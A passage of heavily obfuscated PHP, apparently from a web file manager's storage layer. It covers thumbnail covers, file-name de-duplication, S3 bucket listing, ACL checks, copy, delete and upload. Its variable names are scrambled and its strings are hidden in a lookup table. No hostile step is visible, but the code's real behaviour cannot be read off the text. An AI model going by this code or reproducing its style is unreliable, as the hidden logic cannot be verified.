$ÉØ§ŠÍ¤ = IO::mkdir($ãÆ¬šŞÎ); } if ($Û¼¾‹­“[$šÜáØî¼[199]] == $šÜáØî¼[200] && isset($Û¼¾‹­“[$šÜáØî¼[201]]) && $Û¼¾‹­“[$šÜáØî¼[201]] == kodIO::sourceID($ÉØ§ŠÍ¤)) { $Ë£„Š˜é = $Û¼¾‹­“[$šÜáØî¼[202]]; if ($å‡ôÑ¤è <= 500) { $×”€ìıÛ = preg_replace($šÜáØî¼[203], $šÜáØî¼[204], $Û¼¾‹­“[$šÜáØî¼[42]]); $Ë£„Š˜é = IO::fileNameExist($ÉØ§ŠÍ¤, $×”€ìıÛ); } return IO::fileOut(KodIO::make($Ë£„Š˜é), !1, $Û¼¾‹­“[$šÜáØî¼[42]]); } $í³öÂîü = IO::fileNameExist($ÉØ§ŠÍ¤, $¬Ûõ’áŸ); if ($í³öÂîü) { return IO::fileOut(KodIO::make($í³öÂîü), !1, $Û¼¾‹­“[$šÜáØî¼[42]]); } if ($å‡ôÑ¤è > 1000) { $this->makeImageCover($ÉØ§ŠÍ¤, $•Ô ¶îÌ, $¬Ûõ’áŸ, $å‡ôÑ¤è); $this->makeImageCover($ÉØ§ŠÍ¤, $•Ô ¶îÌ, "\143\x6f\166\145\x72\x5f{$ËÇ©ì£‹}\x5f\62\x35\60\x2e\x70\156\147", 250); $í³öÂîü = IO::fileNameExist($ÉØ§ŠÍ¤, $¬Ûõ’áŸ); if ($í³öÂîü) { return IO::fileOut(KodIO::make($í³öÂîü), !1, $Û¼¾‹­“[$šÜáØî¼[42]]); } die; } if (!kodIO::allowCover($Û¼¾‹­“)) { return $this->fileOut($•Ô ¶îÌ, !1, $Û¼¾‹­“[$šÜáØî¼[42]]); } $ÜàÂö§ò = Cache::get($¬Ûõ’áŸ); if ($ÜàÂö§ò == $šÜáØî¼[205] || $ÜàÂö§ò == $šÜáØî¼[206]) { echo $ÜàÂö§ò; die; } Cache::set($¬Ûõ’áŸ, $šÜáØî¼[206], 60); $À–ş¥ğÚ = array($ÉØ§ŠÍ¤, $Û¼¾‹­“[$šÜáØî¼[97]], $¬Ûõ’áŸ, $å‡ôÑ¤è); $„¸½úÇŠ = $šÜáØî¼[207] . $Û¼¾‹­“[$šÜáØî¼[89]] . $šÜáØî¼[208] . $¬Ûõ’áŸ . $šÜáØî¼[209] . $Û¼¾‹­“[$šÜáØî¼[42]] . $šÜáØî¼[210] . $Û¼¾‹­“[$šÜáØî¼[97]]; TaskQueue::add($šÜáØî¼[211], $À–ş¥ğÚ, $„¸½úÇŠ, $¬Ûõ’áŸ); } public function makeImageCover($îÊëØï¡, $æÈÎ¸‚, $†„´¹Í˜, $°¨ÃÁûÌ) { $…‘«ØÙœ =& $_SERVER[‰‰Ş‚€]; if (IO::fileNameExist($îÊëØï¡, $†„´¹Í˜)) { return $…‘«ØÙœ[212]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ìä¤÷¸å = $this->getPathOuter($æÈÎ¸‚); $òÖ¸ã’ = DATA_THUMB . $†„´¹Í˜; del_file($òÖ¸ã’); $€©­¸Ìû = IO::copy($ìä¤÷¸å, TEMP_FILES, !1, $†„´¹Í˜); if (!@file_exists($€©­¸Ìû)) { return $…‘«ØÙœ[213]; } ImageThumb::createThumb($€©­¸Ìû, $òÖ¸ã’, $°¨ÃÁûÌ, $°¨ÃÁûÌ * 10); if (@file_exists($òÖ¸ã’)) { Cache::remove($†„´¹Í˜); return IO::move($òÖ¸ã’, $îÊëØï¡); } Cache::set($†„´¹Í˜, $…‘«ØÙœ[205], 600); del_file($òÖ¸ã’); return $…‘«ØÙœ[214] . $€©­¸Ìû . $…‘«ØÙœ[84]; } public function fileOutImageServer($óøë™×, $ñŒ Óìî = 250) { $this->fileOutImage($óøë™×, $ñŒ Óìî); } public function fileNameAuto($éÏ÷¹Üø, $Šîü‰õÀ, $æ¾òä¡ä = REPEAT_RENAME, $ßÌ¤ñßõ = false) { $´Ë¦Ùåó =& $_SERVER[‰‰Ş‚€]; $€‹‚şÂ = $éÏ÷¹Üø === $´Ë¦Ùåó[22] ? $Šîü‰õÀ : rtrim($éÏ÷¹Üø, $´Ë¦Ùåó[18]) . $´Ë¦Ùåó[18] . $Šîü‰õÀ; if ($æ¾òä¡ä == REPEAT_REPLACE || !$this->exist($€‹‚şÂ) || $ßÌ¤ñßõ && $æ¾òä¡ä != REPEAT_RENAME_FOLDER) { return $Šîü‰õÀ; } if ($æ¾òä¡ä == REPEAT_SKIP) { return !1; } $Ã´±Íì = $´Ë¦Ùåó[20] . get_path_ext($Šîü‰õÀ); $Ã´±Íì = $Ã´±Íì == $´Ë¦Ùåó[20] || $ßÌ¤ñßõ ? $´Ë¦Ùåó[22] : $Ã´±Íì; $ÁÈµ‚ª = 1; $ùÈ£ßŸ« = substr($Šîü‰õÀ, 0, strlen($Šîü‰õÀ) - strlen($Ã´±Íì)); $±°ãİ¹ß = $ùÈ£ßŸ« . "\x28{$ÁÈµ‚ª}\51{$Ã´±Íì}"; while ($this->exist(rtrim($éÏ÷¹Üø, $´Ë¦Ùåó[18]) . $´Ë¦Ùåó[18] . $±°ãİ¹ß)) { $±°ãİ¹ß = $ùÈ£ßŸ« . "\x28{$ÁÈµ‚ª}\51{$Ã´±Íì}"; $ÁÈµ‚ª++; } return $±°ãİ¹ß; } private function fileNameAutoList($â¥ğï†, $ãŞşñ™±, $ëƒ¦ …  = false) { $ÑÓ‘©‚§ =& $_SERVER[‰‰Ş‚€]; $Ş Îëîæ = $this->listPath($â¥ğï†, !0); $Ş Îëîæ = array_merge($Ş Îëîæ[$ÑÓ‘©‚§[95]], $Ş Îëîæ[$ÑÓ‘©‚§[96]]); $Ú£Ä…ˆ‡ = array_to_keyvalue($Ş Îëîæ, $ÑÓ‘©‚§[22], $ÑÓ‘©‚§[42]); $ª¦­¨ÆÄ = $ÑÓ‘©‚§[20] . get_path_ext($ãŞşñ™±); $ª¦­¨ÆÄ = $ª¦­¨ÆÄ == $ÑÓ‘©‚§[20] || $ëƒ¦ …  ? $ÑÓ‘©‚§[22] : $ª¦­¨ÆÄ; $êéë ¹· = substr($ãŞşñ™±, 0, strlen($ãŞşñ™±) - strlen($ª¦­¨ÆÄ)); $ÌÏå­¡Ô = $êéë ¹· . "\50\60\51{$ª¦­¨ÆÄ}"; for ($õ‡Â˜è‹ = 1; $õ‡Â˜è‹ <= count($Ú£Ä…ˆ‡) + 1; $õ‡Â˜è‹++) { $ÌÏå­¡Ô = $êéë ¹· . "\x28{$õ‡Â˜è‹}\x29{$ª¦­¨ÆÄ}"; if (!in_array_not_case($ÌÏå­¡Ô, $Ú£Ä…ˆ‡)) { return $ÌÏå­¡Ô; } } return $ÌÏå­¡Ô; } public function listAllFiles($ÛÒ³ûû, $¦ªƒÀú¢) { $¾êí…¸á =& $_SERVER[‰‰Ş‚€]; if (empty($¦ªƒÀú¢)) { return array(); } $Æı“‚Óò = array_keys($¦ªƒÀú¢); $¦æ¬œ©¨ = array(); $ÛÒ³ûû = trim($ÛÒ³ûû, $¾êí…¸á[18]); foreach ($¦ªƒÀú¢ as $ĞºÓ•‡¼ => $éËÇÊ÷) { $’Õş¹Ù = ltrim(substr(trim($ĞºÓ•‡¼, $¾êí…¸á[18]), strlen($ÛÒ³ûû)), $¾êí…¸á[18]); if (substr($ĞºÓ•‡¼, -1) == $¾êí…¸á[18]) { $’Õş¹Ù = rtrim($’Õş¹Ù, $¾êí…¸á[18]) . $¾êí…¸á[18]; } $¦æ¬œ©¨ = array_merge($¦æ¬œ©¨, $this->slicePath($’Õş¹Ù)); } $’»¢å±† = array(); foreach (array_unique($¦æ¬œ©¨) as $í½ê¦úš) { $Ò•¸¼ÅÛ = array($¾êí…¸á[97] => $this->getPathOuter($¾êí…¸á[18] . $ÛÒ³ûû . $¾êí…¸á[18] . $í½ê¦úš), $¾êí…¸á[88] => 1, $¾êí…¸á[89] => 0); if (substr($í½ê¦úš, -1) != $¾êí…¸á[18]) { $Ò•¸¼ÅÛ[$¾êí…¸á[88]] = 0; $Àª¦³… = $this->getPath($ÛÒ³ûû . $¾êí…¸á[18] . $í½ê¦úš); if (isset($¦ªƒÀú¢[$Àª¦³…])) { $ù€¥‰Ï£ = $¦ªƒÀú¢[$Àª¦³…]; if (isset($ù€¥‰Ï£[$¾êí…¸á[89]])) { $Ò•¸¼ÅÛ[$¾êí…¸á[89]] = intval($ù€¥‰Ï£[$¾êí…¸á[89]]); } if (isset($ù€¥‰Ï£[$¾êí…¸á[215]])) { $Ò•¸¼ÅÛ[$¾êí…¸á[98]] = intval($ù€¥‰Ï£[$¾êí…¸á[215]]); } } } $’»¢å±†[] = $Ò•¸¼ÅÛ; } return $’»¢å±†; } public function slicePath($í’±¼™ˆ) { $ÍÇÊ‘å =& $_SERVER[‰‰Ş‚€]; $³ğÓ–Á = explode($ÍÇÊ‘å[18], trim($í’±¼™ˆ, $ÍÇÊ‘å[18])); $àº‚ç·¹ = 0; do { ++$àº‚ç·¹; $Ø·ÏüÀô[] = implode($ÍÇÊ‘å[18], array_slice($³ğÓ–Á, 0, $àº‚ç·¹)) . $ÍÇÊ‘å[18]; } while ($àº‚ç·¹ < count($³ğÓ–Á)); $Ø·ÏüÀô[count($³ğÓ–Á) - 1] = $í’±¼™ˆ; return $Ø·ÏüÀô; } public function getHost() { $¡¨œğ‘Æ =& $_SERVER[‰‰Ş‚€]; $¾ğ®É· = parse_url(trim($this->domain, $¡¨œğ‘Æ[18])); $æô»Ù‚· = isset($¾ğ®É·[$¡¨œğ‘Æ[216]]) ? $¾ğ®É·[$¡¨œğ‘Æ[216]] : http_type(); $ò‡û×°ï = isset($¾ğ®É·[$¡¨œğ‘Æ[217]]) ? $¾ğ®É·[$¡¨œğ‘Æ[217]] : $¾ğ®É·[$¡¨œğ‘Æ[97]]; if (isset($¾ğ®É·[$¡¨œğ‘Æ[218]])) { $ò‡û×°ï .= $¡¨œğ‘Æ[14] . $¾ğ®É·[$¡¨œğ‘Æ[218]]; } return $æô»Ù‚· . $¡¨œğ‘Æ[219] . $ò‡û×°ï; } public function pathEncode($ïõ©Ê¨Ï) { $Ñô©ú¡ =& $_SERVER[‰‰Ş‚€]; return str_replace($Ñô©ú¡[220], $Ñô©ú¡[18], rawurlencode($ïõ©Ê¨Ï)); } public function writeLog($‡¾õ…•š = '', $ÈåÊÚŠŸ = false) { $ş¨ŞÂ¯Í =& $_SERVER[‰‰Ş‚€]; $©Ä’½æ° = in_array(ACTION, array($ş¨ŞÂ¯Í[221], $ş¨ŞÂ¯Í[222])); if (!$©Ä’½æ° && !GLOBAL_DEBUG) { return; } $’´çŸøÕ = $‡¾õ…•š; static $±æøä›İ = null; if (!$±æøä›İ) { $±æøä›İ = strtoupper($this->getType()); } $‡¾õ…•š = $±æøä›İ . $ş¨ŞÂ¯Í[223] . $‡¾õ…•š; if ($ÈåÊÚŠŸ) { $Ãµ©Üó = error_get_last(); if ($Ãµ©Üó) { $‡¾õ…•š = array($‡¾õ…•š, $Ãµ©Üó); } } write_log($‡¾õ…•š, $ş¨ŞÂ¯Í[224]); if ($©Ä’½æ°) { throw new Exception($’´çŸøÕ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($™ö—»Ù½) { set_timeout(); require_once SDK_DIR . $_SERVER[‰‰Ş‚€][225]; parent::__construct(); $this->_init($™ö—»Ù½); } public function _init($¬£ê©´«) { $…áÎØ˜Ä =& $_SERVER[‰‰Ş‚€]; $this->config = $¬£ê©´«; foreach ($¬£ê©´« as $©ší¯¸Ñ => $«ÛÅ…ì‡) { if (isset($this->{$©ší¯¸Ñ})) { $this->{$©ší¯¸Ñ} = $«ÛÅ…ì‡; } } $this->endpoint = $¬£ê©´«[$…áÎØ˜Ä[226]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $â«¾ƒÑİ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($â«¾ƒÑİ, 0, 7) == $…áÎØ˜Ä[227]) { $â«¾ƒÑİ = $…áÎØ˜Ä[228] . substr($â«¾ƒÑİ, 7); } $this->client->setEndpoint($â«¾ƒÑİ); if (in_array(ACTION, array($…áÎØ˜Ä[221], $…áÎØ˜Ä[222]))) { $this->client->setExceptions(); } } public function setSignVersion($¡¼Î˜ÎÀ = "\166\x34") { $this->signVer = $¡¼Î˜ÎÀ; $this->client->setSignVersion($¡¼Î˜ÎÀ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ßØƒ¤âı) { return null; } } public function isBucketCors() { $§‡Ëøø =& $_SERVER[‰‰Ş‚€]; $À©ñëÂ = $this->getBucketCors(); if (!$À©ñëÂ || !is_array($À©ñëÂ)) { return !1; } if (!is_array($À©ñëÂ[$§‡Ëøø[229]])) { $À©ñëÂ[$§‡Ëøø[229]] = explode($§‡Ëøø[60], $À©ñëÂ[$§‡Ëøø[229]]); } if ($À©ñëÂ[$§‡Ëøø[230]] != $§‡Ëøø[231] || !in_array($§‡Ëøø[231], $À©ñëÂ[$§‡Ëøø[229]])) { return !1; } $µ£ÉÍ¡ = array_map($§‡Ëøø[232], $À©ñëÂ[$§‡Ëøø[233]]); if (!is_array($µ£ÉÍ¡)) { $µ£ÉÍ¡ = array(); } $™ƒ±î¹ = array($§‡Ëøø[234], $§‡Ëøø[235], $§‡Ëøø[236], $§‡Ëøø[237], $§‡Ëøø[238]); $ˆˆ«˜·± = array_diff($™ƒ±î¹, $µ£ÉÍ¡); return empty($ˆˆ«˜·±); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ˆ±±Ó, $Å§îßßç = '', $µº÷æ•é = REPEAT_RENAME) { $Ä±ü‹¨È = $this->setContent($ˆ±±Ó, $Å§îßßç); if ($Ä±ü‹¨È !== !1) { return $this->getPathOuter($ˆ±±Ó); } return !1; } public function mkdir($Ñ¨ÙÀ³, $ï­İšş— = REPEAT_SKIP) { $ ºôŸ¡¡ =& $_SERVER[‰‰Ş‚€]; if (empty($Ñ¨ÙÀ³) && $Ñ¨ÙÀ³ !== $ ºôŸ¡¡[239]) { return !1; } if ($ï­İšş— && $this->_isFolder($Ñ¨ÙÀ³)) { return $this->getPathOuter($Ñ¨ÙÀ³); } $ÎúĞšåı = $this->setContent($Ñ¨ÙÀ³, $ ºôŸ¡¡[22], !0); if ($ÎúĞšåı !== !1) { return $this->getPathOuter($Ñ¨ÙÀ³); } return !1; } public function copyFile($¸ğ¾Ã, $µ©£ÄÊ, $äå‹À¶Ì = array()) { $°ßÓòÖ× =& $_SERVER[‰‰Ş‚€]; $ˆİ—±È› = $this->objectMeta($¸ğ¾Ã); if (!$ˆİ—±È›) { return !1; } if ($ˆİ—±È›[$°ßÓòÖ×[89]] <= 1024 * 1024 * 200) { $¶ùÖÆë = $this->client->copyObject($this->bucket, $¸ğ¾Ã, $this->bucket, $µ©£ÄÊ, $°ßÓòÖ×[240], $äå‹À¶Ì); } else { $¶ùÖÆë = $this->client->multiCopyObject($this->bucket, $¸ğ¾Ã, $this->bucket, $µ©£ÄÊ, $äå‹À¶Ì); } $¶ùÖÆë = $¶ùÖÆë ? $this->getPathOuter($µ©£ÄÊ) : !1; return $¶ùÖÆë; } public function moveFile($Üºù¥İ†, $²æ‰ê´) { if ($this->copyFile($Üºù¥İ†, $²æ‰ê´)) { $this->delFile($Üºù¥İ†); return $this->getPathOuter($²æ‰ê´); } return !1; } public function delFile($ĞÏ¢®) { return $this->client->deleteObject($this->bucket, $ĞÏ¢®); } public function delFolder($õÂÖ¯Ÿí) { $×â´İ…ü =& $_SERVER[‰‰Ş‚€]; if (!$this->exist($õÂÖ¯Ÿí)) { return !0; } $this->listItemCache = !1; $²©¨Ğ˜Ó = $this->fileList($õÂÖ¯Ÿí); $this->listItemCache = !0; $ü øÃô = trim($õÂÖ¯Ÿí, $×â´İ…ü[18]) . $×â´İ…ü[18]; if (!empty($õÂÖ¯Ÿí) && $õÂÖ¯Ÿí !== $×â´İ…ü[239] && !in_array($ü øÃô, $²©¨Ğ˜Ó[$×â´İ…ü[95]])) { $²©¨Ğ˜Ó[$×â´İ…ü[95]][] = $ü øÃô; } $’Óß¯ÔÔ = $this->delByBatch($²©¨Ğ˜Ó[$×â´İ…ü[96]]); if (!$’Óß¯ÔÔ) { return !1; } $’Óß¯ÔÔ = $this->delByBatch($²©¨Ğ˜Ó[$×â´İ…ü[95]]); if (!$’Óß¯ÔÔ) { return !1; } return $this->delFile($ü øÃô); } private function delByBatch($äÍ‡áø±) { foreach (array_chunk($äÍ‡áø±, 1000) as $ûó€–®œ) { $²ƒºÖòß = $this->client->deleteObjects($this->bucket, $ûó€–®œ); if (!$²ƒºÖòß) { return !1; } } return !0; } public function rename($¬Ùˆ´³È, $ğäÖ¾„Ÿ) { return $this->renameObject($¬Ùˆ´³È, $ğäÖ¾„Ÿ); } public function listPath($ÒŸØÊáí, $Ö­º©Ï¥ = false) { $Ã¦áñ¢· =& $_SERVER[‰‰Ş‚€]; $ûÊ¨¸ß = $this->fileList($ÒŸØÊáí, $Ã¦áñ¢·[18], !0); foreach ($ûÊ¨¸ß[$Ã¦áñ¢·[95]] as $””æòØ => $É‚ÍË™) { $ûÊ¨¸ß[$Ã¦áñ¢·[95]][$””æòØ] = $this->folderInfo($É‚ÍË™, $Ö­º©Ï¥, $É‚ÍË™); } foreach ($ûÊ¨¸ß[$Ã¦áñ¢·[96]] as $””æòØ => $É‚ÍË™) { $ûÊ¨¸ß[$Ã¦áñ¢·[96]][$””æòØ] = $this->fileInfo($É‚ÍË™[$Ã¦áñ¢·[42]], $Ö­º©Ï¥, $É‚ÍË™); } return $ûÊ¨¸ß; } protected function infoChildren($©èŞµà, &$±éšû±¼) { $„ï®¶¶ =& $_SERVER[‰‰Ş‚€]; $ê¡¢ı£Ş = $this->fileList($©èŞµà, $„ï®¶¶[22], !0); $±éšû±¼[$„ï®¶¶[91]] += count($ê¡¢ı£Ş[$„ï®¶¶[95]]); $±éšû±¼[$„ï®¶¶[90]] += count($ê¡¢ı£Ş[$„ï®¶¶[96]]); foreach ($ê¡¢ı£Ş[$„ï®¶¶[96]] as $¿×õí‰) { if (!$¿×õí‰ || !$¿×õí‰[$„ï®¶¶[89]]) { continue; } $±éšû±¼[$„ï®¶¶[89]] += $¿×õí‰[$„ï®¶¶[89]]; } } private function fileInfo($ñİ‡Åãï, $Æï°ŸŠ£ = false, $â€“¿» = array()) { $ä‡Ş–‡Ç =& $_SERVER[‰‰Ş‚€]; $ÉàƒÚÆÛ = array($ä‡Ş–‡Ç[42] => $this->pathThis($ñİ‡Åãï), $ä‡Ş–‡Ç[97] => $this->getPathOuter($ñİ‡Åãï), $ä‡Ş–‡Ç[43] => $ä‡Ş–‡Ç[241], $ä‡Ş–‡Ç[177] => $this->ext($ñİ‡Åãï), $ä‡Ş–‡Ç[89] => isset($â€“¿»[$ä‡Ş–‡Ç[89]]) ? $â€“¿»[$ä‡Ş–‡Ç[89]] : 0); if ($Æï°ŸŠ£) { return $ÉàƒÚÆÛ; } $ÉàƒÚÆÛ[$ä‡Ş–‡Ç[242]] = $ÉàƒÚÆÛ[$ä‡Ş–‡Ç[98]] = 0; $ÉàƒÚÆÛ[$ä‡Ş–‡Ç[243]] = $ÉàƒÚÆÛ[$ä‡Ş–‡Ç[244]] = !0; if (empty($â€“¿»)) { $â€“¿» = $this->objectMeta($ñİ‡Åãï); if (!$â€“¿») { return $ÉàƒÚÆÛ; } } if (isset($â€“¿»[$ä‡Ş–‡Ç[245]]) && $â€“¿»[$ä‡Ş–‡Ç[245]]) { $ÉàƒÚÆÛ[$ä‡Ş–‡Ç[246]] = $â€“¿»[$ä‡Ş–‡Ç[245]]; } if (isset($â€“¿»[$ä‡Ş–‡Ç[215]])) { $ÉàƒÚÆÛ[$ä‡Ş–‡Ç[98]] = $â€“¿»[$ä‡Ş–‡Ç[215]]; } if (isset($â€“¿»[$ä‡Ş–‡Ç[89]])) { $ÉàƒÚÆÛ[$ä‡Ş–‡Ç[89]] = $â€“¿»[$ä‡Ş–‡Ç[89]]; } return $ÉàƒÚÆÛ; } private function folderInfo($²¯Èê½, $¦è£Õ¨ = false, $ääÏÂ‹ì = array()) { $‡Ì½»Êà =& $_SERVER[‰‰Ş‚€]; $’Ì¡˜×© = array($‡Ì½»Êà[42] => $this->pathThis($²¯Èê½), $‡Ì½»Êà[97] => $this->getPathOuter($‡Ì½»Êà[18] . $²¯Èê½), $‡Ì½»Êà[43] => $‡Ì½»Êà[88]); if ($¦è£Õ¨) { return $’Ì¡˜×©; } $’Ì¡˜×©[$‡Ì½»Êà[242]] = $’Ì¡˜×©[$‡Ì½»Êà[98]] = 0; $’Ì¡˜×©[$‡Ì½»Êà[243]] = $’Ì¡˜×©[$‡Ì½»Êà[244]] = !0; if ($²¯Èê½ == $‡Ì½»Êà[22]) { return $’Ì¡˜×©; } if (empty($ääÏÂ‹ì)) { $ääÏÂ‹ì = $this->objectMeta(trim($²¯Èê½, $‡Ì½»Êà[18]) . $‡Ì½»Êà[18]); } if (isset($ääÏÂ‹ì[$‡Ì½»Êà[215]])) { $’Ì¡˜×©[$‡Ì½»Êà[242]] = $ääÏÂ‹ì[$‡Ì½»Êà[215]]; } return $’Ì¡˜×©; } private function fileList($ö¿¦‘„·, $Î¹¥õù = '', $¶Ú¼¨”İ = 0) { $»Ôòîµ‹ =& $_SERVER[‰‰Ş‚€]; $ıéŸÁ“µ = rtrim($ö¿¦‘„·, $»Ôòîµ‹[18]) . $»Ôòîµ‹[18]; $ò­§˜ª¡ = $this->listObjs($ıéŸÁ“µ, null, null, $Î¹¥õù); if (!$ò­§˜ª¡) { return array($»Ôòîµ‹[95] => array(), $»Ôòîµ‹[96] => array()); } $ßøŒ¼ = $èıÁíûæ = array(); foreach ($ò­§˜ª¡[$»Ôòîµ‹[247]] as $êê³ğµÖ) { $ß­º§ëŸ = $êê³ğµÖ[$»Ôòîµ‹[42]]; if ($ß­º§ëŸ == $ıéŸÁ“µ) { continue; } $ù¥ èÃÏ = isset($êê³ğµÖ[$»Ôòîµ‹[89]]) ? $êê³ğµÖ[$»Ôòîµ‹[89]] : 0; $¬ûæ¸¥— = $ù¥ èÃÏ == 0 && substr($ß­º§ëŸ, strlen($ß­º§ëŸ) - 1, 1) == $»Ôòîµ‹[18] ? !0 : !1; $this->cacheMethodInfoSet($ß­º§ëŸ, $¬ûæ¸¥—, $êê³ğµÖ); if ($¬ûæ¸¥—) { $ßøŒ¼[] = $ß­º§ëŸ; continue; } $èıÁíûæ[] = $¶Ú¼¨”İ ? $êê³ğµÖ : $ß­º§ëŸ; } foreach ($ò­§˜ª¡[$»Ôòîµ‹[248]] as $êê³ğµÖ) { $ßøŒ¼[] = $êê³ğµÖ[$»Ôòîµ‹[42]]; $this->cacheMethodInfoSet($êê³ğµÖ[$»Ôòîµ‹[42]], !0); } $this->cacheMethodInfoSet($ö¿¦‘„·, !0); return array($»Ôòîµ‹[95] => $ßøŒ¼, $»Ôòîµ‹[96] => $èıÁíûæ); } private function listObjs($•»œãÇ², $›üšª¶å = null, $¶çËÇÛÖ = null, $ËÕ÷ººì = null) { $ŠÁÙÌÂÎ =& $_SERVER[‰‰Ş‚€]; $•»œãÇ² = trim($•»œãÇ², $ŠÁÙÌÂÎ[18]); $ƒàª¶ø = empty($•»œãÇ²) && $•»œãÇ² !== $ŠÁÙÌÂÎ[239] ? $ŠÁÙÌÂÎ[22] : $•»œãÇ² . $ŠÁÙÌÂÎ[18]; return $this->client->getBucket($this->bucket, $ƒàª¶ø, $›üšª¶å, $¶çËÇÛÖ, $ËÕ÷ººì, !0); } public function has($Ó°’Ê³Ì, $›áªóÒ­ = false, $ÔÂ·©÷€ = true) { $±¤ĞÌ» =& $_SERVER[‰‰Ş‚€]; $Ó°’Ê³Ì = trim($Ó°’Ê³Ì, $±¤ĞÌ»[18]); $ÊìÑ‰°™ = empty($Ó°’Ê³Ì) && $Ó°’Ê³Ì !== $±¤ĞÌ»[239] ? $±¤ĞÌ»[22] : $Ó°’Ê³Ì . $±¤ĞÌ»[18]; $šçÖÅêÛ = null; $„÷öÂªŒ = 500; $ğö¥”º = $±¤ĞÌ»[18]; $¨Ñ‘¿Œ² = $–™ëÙÓÙ = array(); while (!0) { $ëñª®şê = $this->listObjs($Ó°’Ê³Ì, $šçÖÅêÛ, $„÷öÂªŒ, $ğö¥”º); if (!$ëñª®şê) { break; } $šçÖÅêÛ = $ëñª®şê[$±¤ĞÌ»[249]]; $Æ’°¼Ó– = $ëñª®şê[$±¤ĞÌ»[247]]; $§øµç­Œ = $ëñª®şê[$±¤ĞÌ»[248]]; if (empty($Æ’°¼Ó–) && empty($§øµç­Œ)) { break; } if (count($Æ’°¼Ó–) == 1 && $Æ’°¼Ó–[0][$±¤ĞÌ»[42]] == $ÊìÑ‰°™) { break; } if ($›áªóÒ­) { if (count($Æ’°¼Ó–)) { $Æ’°¼Ó– = array_column($Æ’°¼Ó–, $±¤ĞÌ»[42]); $¨Ñ‘¿Œ² = array_merge($¨Ñ‘¿Œ², $Æ’°¼Ó–); } if (count($§øµç­Œ)) { $§øµç­Œ = array_column($§øµç­Œ, $±¤ĞÌ»[42]); $–™ëÙÓÙ = array_merge($–™ëÙÓÙ, $§øµç­Œ); } if ($šçÖÅêÛ === null) { break; } continue; } if ($ÔÂ·©÷€) { if (!empty($Æ’°¼Ó–)) { if (count($Æ’°¼Ó–) > 1 || isset($Æ’°¼Ó–[0][$±¤ĞÌ»[42]]) && $Æ’°¼Ó–[0][$±¤ĞÌ»[42]] != $ÊìÑ‰°™) { return !0; } } } else { if (!empty($§øµç­Œ)) { return !0; } } if ($šçÖÅêÛ === null) { break; } } if ($›áªóÒ­) { $¨Ñ‘¿Œ² = array_diff($¨Ñ‘¿Œ², array($ÊìÑ‰°™)); $¨Ñ‘¿Œ² = count(array_unique($¨Ñ‘¿Œ²)); $–™ëÙÓÙ = count(array_unique($–™ëÙÓÙ)); return array($±¤ĞÌ»[250] => $¨Ñ‘¿Œ², $±¤ĞÌ»[251] => $–™ëÙÓÙ); } return !1; } public function listAll($…÷ù‘ˆË) { $Ú‘ÖÜ‚ =& $_SERVER[‰‰Ş‚€]; $¨ØÖÜü§ = $this->fileList($…÷ù‘ˆË, $Ú‘ÖÜ‚[22], !0); $ğâş” = array_to_keyvalue($¨ØÖÜü§[$Ú‘ÖÜ‚[96]], $Ú‘ÖÜ‚[42]); foreach ($¨ØÖÜü§[$Ú‘ÖÜ‚[95]] as $ÏÃâ§) { if (is_string($ÏÃâ§)) { $ğâş”[$ÏÃâ§] = array($Ú‘ÖÜ‚[89] => 0); } } return $this->listAllFiles($…÷ù‘ˆË, $ğâş”); } public function canRead($éªÓ®®ˆ) { $¢ˆÖêí =& $_SERVER[‰‰Ş‚€]; $âøü‹ï´ = $this->client->getAccessControlPolicy($this->bucket, $éªÓ®®ˆ); if (!$âøü‹ï´) { return !1; } return in_array($âøü‹ï´, array($¢ˆÖêí[252], $¢ˆÖêí[253], $¢ˆÖêí[254])) ? !0 : !1; } public function canWrite($ØğèÉ”“) { $àµıËò… =& $_SERVER[‰‰Ş‚€]; $ş¥œ›Ò› = $this->client->getAccessControlPolicy($this->bucket, $ØğèÉ”“); if (!$ş¥œ›Ò›) { return !1; } return in_array($ş¥œ›Ò›, array($àµıËò…[252], $àµıËò…[253])) ? !0 : !1; } public function getContent($ùÃ†¦Ø) { return $this->client->getObject($this->bucket, $ùÃ†¦Ø); } public function setContent($‡’€’Á, $ÆÛİä¢Á = '', $â²Ûï = false) { $é¨—²Ç =& $_SERVER[‰‰Ş‚€]; $‡’€’Á = $â²Ûï ? trim($‡’€’Á, $é¨—²Ç[18]) . $é¨—²Ç[18] : $‡’€’Á; $ˆ½•Ô‰Ö = get_file_mime(get_path_ext($‡’€’Á)); $Š÷‚¦˜ë = $this->client->putObject($ÆÛİä¢Á, $this->bucket, $‡’€’Á, $é¨—²Ç[240], array(), $ˆ½•Ô‰Ö); if (!$Š÷‚¦˜ë) { return !1; } if ($â²Ûï) { return !0; } return $Š÷‚¦˜ë ? !0 : !1; } public function fileSubstr($ßü™ïÎ…, $çåôØ‚Ê, $É“ãÅå) { $ ×šèĞ© = $çåôØ‚Ê + $É“ãÅå - 1; return $this->client->getObject($this->bucket, $ßü™ïÎ…, array($_SERVER[‰‰Ş‚€][255] => "\x62\x79\x74\x65\163\x3d{$çåôØ‚Ê}\x2d{$ ×šèĞ©}")); } public function upload($Ã«­Ó¶³, $ıÈ¹¾¸ô, $¹’ÙñîÍ = false, $ˆûï®Ÿş = REPEAT_REPLACE) { $—ğ½œÒ¯ =& $_SERVER[‰‰Ş‚€]; $ÕøÒÏÈ‡ = array($—ğ½œÒ¯[256] => @md5_file($ıÈ¹¾¸ô)); $øÛÌèü = array($—ğ½œÒ¯[257] => get_file_mime(get_path_ext($Ã«­Ó¶³))); if (IO::size($ıÈ¹¾¸ô) <= 1024 * 1024 * 200) { $„¿Æöà° = $this->client->putObjectFile($ıÈ¹¾¸ô, $this->bucket, $Ã«­Ó¶³, $—ğ½œÒ¯[240], $ÕøÒÏÈ‡, $øÛÌèü); return !empty($„¿Æöà°) ? $this->getPathOuter($Ã«­Ó¶³) : !1; } $–ˆÁ¡È¦ = 